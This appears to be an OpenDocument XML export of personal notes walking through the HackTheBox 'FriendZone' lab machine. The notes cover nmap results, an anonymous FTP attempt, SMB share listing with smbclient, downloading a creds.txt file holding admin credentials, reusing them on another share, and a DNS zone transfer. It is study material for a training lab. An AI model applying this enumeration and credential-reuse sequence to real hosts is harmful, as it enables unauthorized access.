      <text:p text:style-name="P49"/>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P28">Download a file to your local computer:</text:p>
      <text:p text:style-name="P65">get &lt;file&gt;</text:p>
      <text:p text:style-name="P65"/>
      <text:p text:style-name="P65"/>
      <text:p text:style-name="P65"/>
      <text:p text:style-name="P86"/>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P29">EXAMPLE on 10.10.10.123</text:p>
      <text:p text:style-name="P46"><text:a xlink:type="simple" xlink:href="https://sckullbock.blogspot.com/2019/07/hack-box-friendzone-writeup.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://sckullbock.blogspot.com/2019/07/hack-box-friendzone-writeup.html</text:a></text:p>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P20">1) Nmap to see open ports:</text:p>
      <text:p text:style-name="P58">PORT <text:s text:c="3"/>STATE SERVICE <text:s text:c="4"/>VERSION</text:p>
      <text:p text:style-name="P58">21/tcp <text:s/>open <text:s/>ftp <text:s text:c="8"/>vsftpd 3.0.3</text:p>
      <text:p text:style-name="P58">22/tcp <text:s/>open <text:s/>ssh <text:s text:c="8"/>OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</text:p>
      <text:p text:style-name="P58">53/tcp <text:s/>open <text:s/>domain <text:s text:c="5"/>ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)</text:p>
      <text:p text:style-name="P58">80/tcp <text:s/>open <text:s/>http <text:s text:c="7"/>Apache httpd 2.4.29 ((Ubuntu))</text:p>
      <text:p text:style-name="P58">139/tcp open <text:s/>netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</text:p>
      <text:p text:style-name="P58">443/tcp open <text:s/>ssl/http <text:s text:c="3"/>Apache httpd 2.4.29</text:p>
      <text:p text:style-name="P58">445/tcp open <text:s/>netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</text:p>
      <text:p text:style-name="P58">Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</text:p>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P20">Enum ftp:</text:p>
      <text:p text:style-name="P58">Try login as anonymous user, <text:span text:style-name="T28">leave the password in blank</text:span></text:p>
      <text:p text:style-name="P58"/>
      <text:p text:style-name="P58">ftp domain.com</text:p>
      <text:p text:style-name="P58">ftp ip</text:p>
      <text:p text:style-name="P58">ftp <text:a xlink:type="simple" xlink:href="mailto:user@domain" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">user@domain</text:a></text:p>
      <text:p text:style-name="P58"/>
      <text:p text:style-name="P77">noroot@kali:~/Documents$ <text:span text:style-name="T7">ftp 10.10.10.123</text:span></text:p>
      <text:p text:style-name="P77">Connected to 10.10.10.123.</text:p>
      <text:p text:style-name="P77">220 (vsFTPd 3.0.3)</text:p>
      <text:p text:style-name="P77">Name (10.10.10.123:noroot): <text:span text:style-name="T7">anonymous</text:span></text:p>
      <text:p text:style-name="P77">331 Please specify the password.</text:p>
      <text:p text:style-name="P77">Password:</text:p>
      <text:p text:style-name="P82">530 Login incorrect.</text:p>
      <text:p text:style-name="P77">Login failed.</text:p>
      <text:p text:style-name="P77">ftp&gt; ^C</text:p>
      <text:p text:style-name="P77">ftp&gt; 221 Goodbye.</text:p>
      <text:p text:style-name="P58"/>
      <text:p text:style-name="P19">Enum http:</text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P21">Enum https:</text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P22">Enum smb:</text:p>
      <text:p text:style-name="P60"/>
      <text:p text:style-name="P60">Enum sharefiles on samba service:</text:p>
      <text:p text:style-name="P60">To see which shares are available on a given host, run:</text:p>
      <text:p text:style-name="P60"/>
      <text:p text:style-name="P60"><text:span text:style-name="T7">smbclient</text:span> -L 10.10.10.123</text:p>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P78">noroot@kali:~/Documents$ <text:span text:style-name="T7">smbclient -L 10.10.10.123</text:span></text:p>
      <text:p text:style-name="P78">mkdir failed on directory /var/run/samba/msg.lock: Permission denied</text:p>
      <text:p text:style-name="P78"><text:soft-page-break/>Unable to initialize messaging context</text:p>
      <text:p text:style-name="P78">Enter WORKGROUP\noroot's password: </text:p>
      <text:p text:style-name="P78"/>
      <text:p text:style-name="P78"><text:tab/>Sharename <text:s text:c="8"/>Type <text:s text:c="5"/>Comment</text:p>
      <text:p text:style-name="P78"><text:tab/>--------- <text:s text:c="14"/>---- <text:s text:c="5"/>-------</text:p>
      <text:p text:style-name="P78"><text:tab/>print$ <text:s text:c="15"/>Disk <text:s text:c="5"/>Printer Drivers</text:p>
      <text:p text:style-name="P78"><text:tab/>Files <text:s text:c="17"/>Disk <text:s text:c="5"/>FriendZone Samba Server Files <text:span text:style-name="T7">/etc/Files</text:span></text:p>
      <text:p text:style-name="P78"><text:tab/>general <text:s text:c="13"/>Disk <text:s text:c="5"/>FriendZone Samba Server Files</text:p>
      <text:p text:style-name="P78"><text:tab/>Development <text:s text:c="4"/>Disk <text:s text:c="5"/>FriendZone Samba Server Files</text:p>
      <text:p text:style-name="P78"><text:tab/>IPC$ <text:s text:c="11"/>IPC <text:s text:c="6"/>IPC Service (FriendZone server (Samba, Ubuntu))</text:p>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P23">Connect to <text:span text:style-name="T30">general folder: </text:span><text:span text:style-name="T18">this folder won’t ask for password.</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P83">smbclient \\\\10.10.10.123\\general</text:p>
      <text:p text:style-name="P80">Enter WORKGROUP\root's password: <text:s text:c="2"/><text:span text:style-name="T7">→</text:span><text:span text:style-name="T12"> press return, there is no password for this folder</text:span></text:p>
      <text:p text:style-name="P80">Try "help" to get a list of possible commands.</text:p>
      <text:p text:style-name="P80">smb: \&gt; ls</text:p>
      <text:p text:style-name="P80"><text:s text:c="2"/>. <text:s text:c="34"/>D <text:s text:c="7"/>0 <text:s/>Wed Jan 16 20:10:51 2019</text:p>
      <text:p text:style-name="P80"><text:s text:c="2"/>.. <text:s text:c="33"/>D <text:s text:c="7"/>0 <text:s/>Wed Jan 23 21:51:02 2019</text:p>
      <text:p text:style-name="P80"><text:s text:c="2"/>creds.txt <text:s text:c="26"/>N <text:s text:c="6"/>57 <text:s/>Wed Oct 10 00:52:42 2018</text:p>
      <text:p text:style-name="P80"/>
      <text:p text:style-name="P80"><text:tab/><text:tab/>9221460 blocks of size 1024. 6383124 blocks available</text:p>
      <text:p text:style-name="P80">smb: \&gt; cat creds.txt</text:p>
      <text:p text:style-name="P80">cat: command not found</text:p>
      <text:p text:style-name="P80">smb: \&gt; elp</text:p>
      <text:p text:style-name="P80">elp: command not found</text:p>
      <text:p text:style-name="P80">smb: \&gt; <text:s text:c="2"/>help</text:p>
      <text:p text:style-name="P80">? <text:s text:c="13"/>allinfo <text:s text:c="7"/>altname <text:s text:c="7"/>archive <text:s text:c="7"/>backup <text:s text:c="8"/></text:p>
      <text:p text:style-name="P80">blocksize <text:s text:c="5"/>cancel <text:s text:c="8"/>case_sensitive cd <text:s text:c="12"/>chmod <text:s text:c="9"/></text:p>
      <text:p text:style-name="P80">chown <text:s text:c="9"/>close <text:s text:c="9"/>del <text:s text:c="11"/>deltree <text:s text:c="7"/>dir <text:s text:c="11"/></text:p>
      <text:p text:style-name="P80">du <text:s text:c="12"/>echo <text:s text:c="10"/>exit <text:s text:c="10"/>get <text:s text:c="11"/>getfacl <text:s text:c="7"/></text:p>
      <text:p text:style-name="P80">geteas <text:s text:c="8"/>hardlink <text:s text:c="6"/>help <text:s text:c="10"/>history <text:s text:c="7"/>iosize <text:s text:c="8"/></text:p>
      <text:p text:style-name="P80">lcd <text:s text:c="11"/>link <text:s text:c="10"/>lock <text:s text:c="10"/>lowercase <text:s text:c="5"/>ls <text:s text:c="12"/></text:p>
      <text:p text:style-name="P80">l <text:s text:c="13"/>mask <text:s text:c="10"/>md <text:s text:c="12"/>mget <text:s text:c="10"/>mkdir <text:s text:c="9"/></text:p>
      <text:p text:style-name="P80">more <text:s text:c="10"/>mput <text:s text:c="10"/>newer <text:s text:c="9"/>notify <text:s text:c="8"/>open <text:s text:c="10"/></text:p>
      <text:p text:style-name="P80">posix <text:s text:c="9"/>posix_encrypt <text:s/>posix_open <text:s text:c="4"/>posix_mkdir <text:s text:c="3"/>posix_rmdir <text:s text:c="3"/></text:p>
      <text:p text:style-name="P80">posix_unlink <text:s text:c="2"/>posix_whoami <text:s text:c="2"/>print <text:s text:c="9"/>prompt <text:s text:c="8"/>put <text:s text:c="11"/></text:p>
      <text:p text:style-name="P80">pwd <text:s text:c="11"/>q <text:s text:c="13"/>queue <text:s text:c="9"/>quit <text:s text:c="10"/>readlink <text:s text:c="6"/></text:p>
      <text:p text:style-name="P80">rd <text:s text:c="12"/>recurse <text:s text:c="7"/>reget <text:s text:c="9"/>rename <text:s text:c="8"/>reput <text:s text:c="9"/></text:p>
      <text:p text:style-name="P80">rm <text:s text:c="12"/>rmdir <text:s text:c="9"/>showacls <text:s text:c="6"/>setea <text:s text:c="9"/>setmode <text:s text:c="7"/></text:p>
      <text:p text:style-name="P80"><text:soft-page-break/>scopy <text:s text:c="9"/>stat <text:s text:c="10"/>symlink <text:s text:c="7"/>tar <text:s text:c="11"/>tarmode <text:s text:c="7"/></text:p>
      <text:p text:style-name="P80">timeout <text:s text:c="7"/>translate <text:s text:c="5"/>unlock <text:s text:c="8"/>volume <text:s text:c="8"/>vuid <text:s text:c="10"/></text:p>
      <text:p text:style-name="P80">wdel <text:s text:c="10"/>logon <text:s text:c="9"/>listconnect <text:s text:c="3"/>showconnect <text:s text:c="3"/>tcon <text:s text:c="10"/></text:p>
      <text:p text:style-name="P80">tdis <text:s text:c="10"/>tid <text:s text:c="11"/>utimes <text:s text:c="8"/>logoff <text:s text:c="8"/>.. <text:s text:c="12"/></text:p>
      <text:p text:style-name="P80">! <text:s text:c="13"/></text:p>
      <text:p text:style-name="P80">smb: \&gt; </text:p>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P78">smb: \&gt; <text:span text:style-name="T7">get creds.txt </text:span></text:p>
      <text:p text:style-name="P78">getting file \creds.txt of size 57 as creds.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</text:p>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P66">This will download creds.txt to your local computer.</text:p>
      <text:p text:style-name="P66"/>
      <text:p text:style-name="P81">root@kali:~/Documents# <text:span text:style-name="T7">cat creds.txt </text:span></text:p>
      <text:p text:style-name="P81">creds for the admin THING:</text:p>
      <text:p text:style-name="P81"/>
      <text:p text:style-name="P84">admin:WORKWORKHhallelujah@#</text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P66"><text:span text:style-name="T7">Use new credentials to get on the rest of fileshares,</text:span> only worked on Development</text:p>
      <text:p text:style-name="P46">smbclient \\\\10.10.10.123\\Development --user=admin WORKWORKHhallelujah@#</text:p>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P67">Check that you can create, remove, upload, execute files</text:p>
      <text:p text:style-name="P67"/>
      <text:p text:style-name="P30">Enum subdomains:</text:p>
      <text:p text:style-name="P68"/>
      <text:p text:style-name="P68">dig axfr friendzoneportal.red @10.10.10.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47:19.052000000</meta:creation-date>
    <dc:date>2019-07-21T18:17:10.495000000</dc:date>
    <meta:editing-duration>PT20H3M53S</meta:editing-duration>
    <meta:editing-cycles>55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186" meta:word-count="1057" meta:character-count="8803" meta:non-whitespace-character-count="6623"/>
  </office:meta>
</office:document-meta>
</file>